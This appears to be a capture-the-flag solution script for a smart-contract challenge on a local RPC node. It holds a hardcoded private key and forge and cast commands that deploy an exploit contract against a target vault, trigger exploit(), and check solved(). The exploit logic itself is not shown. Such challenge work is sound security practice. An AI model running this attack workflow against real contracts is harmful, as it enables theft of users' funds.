RPC_URL="http://localhost:8000/a092d0c46a63/rpc"
TARGET="0x3bC0FF50d218a6430654Ef0174FfDca048594faD"
PRIVATE_KEY="0xe7403df38706b432efc38ff221b3983525e43cf4e312a59cf3f51be80d64557c"
VAULT="0x3b478F28B9Af98055D44edbcB87bf71e2A300667"
ATTACKER="0x4aa1211fa9e896bD9b6B3876DED7019014F75362"

# RPC_URL="http://localhost:8000/a092d0c46a63/rpc"
# TARGET="0x3bC0FF50d218a6430654Ef0174FfDca048594faD"
# PRIVATE_KEY="0xe7403df38706b432efc38ff221b3983525e43cf4e312a59cf3f51be80d64557c"
# forge create MyVault --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $TARGET
# VAULT="0x3b478F28B9Af98055D44edbcB87bf71e2A300667"
# forge create SecureVaultExploit --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $TARGET $VAULT --value 0.9ether
# ATTACKER="0x4aa1211fa9e896bD9b6B3876DED7019014F75362"
# cast send --rpc-url $RPC_URL --private-key $PRIVATE_KEY $ATTACKER "exploit()"
# cast call --rpc-url $RPC_URL --private-key $PRIVATE_KEY $TARGET "solved()"